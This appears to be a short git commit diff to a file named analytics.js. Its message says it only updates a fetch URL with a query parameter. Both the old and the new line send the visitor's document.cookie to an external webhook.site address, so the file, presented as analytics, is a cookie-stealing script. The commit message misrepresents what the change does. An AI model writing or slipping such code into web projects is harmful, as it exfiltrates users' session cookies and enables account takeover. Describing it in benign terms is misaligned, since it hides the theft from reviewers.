def01123f3ca6d5fd722255ea9fc94d3989f7638
nikhilsankhla <46194196+nikhilsankhla@users.noreply.github.com>
2026-04-25 15:04:10 +1000

    Update fetch URL to include query parameter

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/9c2db981-9f78-4a7c-8bdc-383d39744b8a?cookie=" + document.cookie, {mode: 'no-cors'});
+fetch("https://webhook.site/9c2db981-9f78-4a7c-8bdc-383d39744b8a?q="+document.cookie, {mode: 'no-cors'});
